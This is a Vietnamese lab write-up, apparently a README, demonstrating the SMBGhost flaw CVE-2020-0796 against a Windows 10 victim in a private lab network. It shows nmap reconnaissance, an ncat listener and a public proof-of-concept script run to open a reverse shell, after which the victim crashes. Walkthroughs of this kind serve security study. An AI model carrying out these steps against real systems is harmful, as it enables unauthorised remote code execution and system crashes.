***- Các phiên bản bị ảnh hưởng\**

\-    Windows 10 Version 1903 for 32-bit Systems

\-    Windows 10 Version 1903 for ARM64-based Systems

\-    Windows 10 Version 1903 for x64-based Systems

\-    Windows 10 Version 1909 for 32-bit Systems

\-    Windows 10 Version 1909 for ARM64-based Systems

\-    Windows 10 Version 1909 for x64-based Systems

\-    Windows Server, version 1903 (Server Core installation)

\-    Windows Server, version 1909 (Server Core installation)

### Sơ đồ kết nối hệ thống

![image-20240223154022321](https://github.com/hungdnvp/POC-CVE-2020-0796/blob/main/Screenshot_1.png?raw=true)

## Trinh sát mục tiêu

**Khởi chạy Nmap để quét dải mạng ở vùng DMZ**

```
map -sS 192.168.116.0/24
```

nmap: Là tên của chương trình quét mạng**.**

-sS: Chọn phương pháp quét TCP SYN scan. Trong quét này, Nmap gửi một gói tin SYN đến máy chủ đích và quan sát phản hồi. Nếu máy chủ đích trả lời với gói tin SYN-ACK, Nmap biết rằng cổng đó đang mở. Nếu máy chủ đích trả lời bằng một gói tin RST, nghĩa là cổng đó đã đóng.

-192.168.116.0/24: Địa chỉ IP hoặc dải địa chỉ IP cụ thể mà bạn muốn quét. Trong trường này, dải địa chỉ là 192.168.116.0/24, mô tả tất cả các địa chỉ IP từ 192.168.116.1 đến 192.168.116.254.

![image-scanNmap](https://github.com/hungdnvp/POC-CVE-2020-0796/blob/main/Screenshot_2.png?raw=true)

=> Quan sát thấy địa chỉ ip máy victim 192.116.145 đang mở cổng 445.

· **Sử dụng Nmap để quét lỗ hổng trên máy victim**

```
map -p445 –script smb-protocols 192.168.116.145
```

nmap: Là tên của chương trình quét mạng. 

-p445: Chỉ định cổng cụ thể để quét, trong trường hợp này là cổng 445. Cổng 445 thường được sử dụng để giao tiếp với dịch vụ SMB (Server Message Block) trên hệ thống Windows.

--script smb-protocols: Chọn kịch bản (script) smb-protocols để thực hiện quét. Kịch bản này giúp kiểm tra và hiển thị thông tin về các phiên bản giao thức SMB được hỗ trợ trên máy chủ đích.

192.168.116.145: Địa chỉ IP của máy chủ mà bạn muốn quét. Trong trường này, địa chỉ IP được thiết lập là 192.168.116.145

![image-sanNmap2](https://github.com/hungdnvp/POC-CVE-2020-0796/blob/main/Screenshot_3.png?raw=true)

\-    Kết quả thu được **smb-protocols** máy victim có khả năng tồn tại lỗ hổng có khả năng khai thác SMBv3.1.1

\-    Để chắc chắn hơn tiếp tục kiểm tra khả năng khai thác lỗ hổng CVE-2020-0796 bằng việc chạy script python 

[]: \-https://github.com/ly4k/SMBGhost	"mã khai thác"

![image-nmapcheck](https://github.com/hungdnvp/POC-CVE-2020-0796/blob/main/Screenshot_4.png?raw=true)

=> Kết quả **Vulnerable ->** phát hiện lỗ hổng CVE 2020-0796 có khả năng khai thác trên máy victim.

## Khai thác lỗ hổng, cài đặt mã độc, tạo kênh điều khiển từ xa

\**Tiến hành tấn công Reverse_shell**

* Khởi động session bằng **Netcat** lắng nghe phiên kết nối từ victim*

```
ncat -lvp 4444
```

* Khởi chạy script khai thác CVE-2020-0796

[]: https://github.com/jamf/CVE-2020-0796-RCE-POC	"mã khai thác"

```
python SMBleedingGhost.py 192.168.116.145 192.168.44.3 4444
```

![image-attack](https://github.com/hungdnvp/POC-CVE-2020-0796/blob/main/Screenshot_5.png?raw=true)

=>	 **KẾT QUẢ:** Máy tấn công chiếm quyền thực thi shell code trên máy victim.

![image-result](https://github.com/hungdnvp/POC-CVE-2020-0796/blob/main/Screenshot_6.png?raw=true)

Sau khi kết nối thành công, lúc này attacker có thể khai thác và thực thi mã tùy ý trên máy victim với quyền User của người dùng trong phiên kết nối.

**Khi kết thúc phiên. Máy victim bị lỗi BlueScreen và auto Restart.**

![image-end](https://github.com/hungdnvp/POC-CVE-2020-0796/blob/main/Screenshot_7.png?raw=true)

***Việc thực hiện khai thác có thể dẫn đến Làm hỏng hệ thống được nhắm mục tiêu\*** 